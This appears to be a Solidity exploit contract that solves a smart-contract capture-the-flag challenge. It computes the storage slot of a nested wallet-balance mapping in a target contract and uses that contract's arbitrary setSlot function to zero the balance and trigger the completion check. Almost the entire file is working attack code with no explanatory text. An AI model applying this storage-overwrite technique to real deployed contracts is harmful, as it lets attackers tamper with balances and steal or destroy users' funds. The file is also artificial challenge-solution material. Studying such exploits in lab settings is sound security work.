// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./1.sol";
contract Attract{
    check public check1;
    ERC20 public erc20; 
    constructor(address addr) public {
        check1 = check(addr);
        erc20 = check1.fake();
    }
    bytes32 arraySolt = keccak256(abi.encodePacked(bytes32(uint256(uint160(address(check1)))),bytes32(0)));
    bytes32 arrayIndexSolt = keccak256(abi.encodePacked(arraySolt));
    bytes32 WalletBalancesSolt = bytes32(uint256(arrayIndexSolt) + 2);
    bytes32 public WalletBalancesSoltIndex = keccak256(abi.encodePacked(bytes32(uint256(uint160(address(erc20)))),bytes32(WalletBalancesSolt)));
    function getArraySolt(address addr,uint256 Solt) public  pure returns(bytes32){
        return keccak256(abi.encodePacked(bytes32(uint256(uint160(addr))),bytes32(Solt)));
    }
    function getArrayIndexSolt(bytes32 solt, uint256 index) public pure returns(bytes32){
        return bytes32(uint256(keccak256(abi.encodePacked(solt))) + index);
    }
    function getWalletBalancesSolt(bytes32 solt,uint256 index) public pure returns(bytes32){
        return  bytes32(uint256(solt) + index);
    }
    function getWalletBalancesSoltIndex(bytes32 solt,address addr) public pure returns(bytes32){
        return keccak256(abi.encodePacked(bytes32(uint256(uint160(address(addr)))),bytes32(solt)));
    }
    function attract() public returns(bytes32) {
        check1.addWallet("zp", address(erc20), 0);
        bytes32 solt = getWalletBalancesSoltIndex(getWalletBalancesSolt(getArrayIndexSolt(getArraySolt(address(check1),0), 0), 2), address(erc20));
        check1.setSlot(solt, bytes32(0));
        check1.isCompleted();
        return solt;
    }
    // struct Wallet{
    //     string walletName;
    //     uint256 uniqueTokens;
    //     mapping(address => uint256)balances;
    // }
    // struct Slot{
    //     bytes32 value;
    // }
    // mapping(address => Wallet[])public wallets;//0
    // wallets[address(this)][0].balances[address(fake)]==0
          
}
// 0x0000000000000000000000000000000000000000000000000000000000000000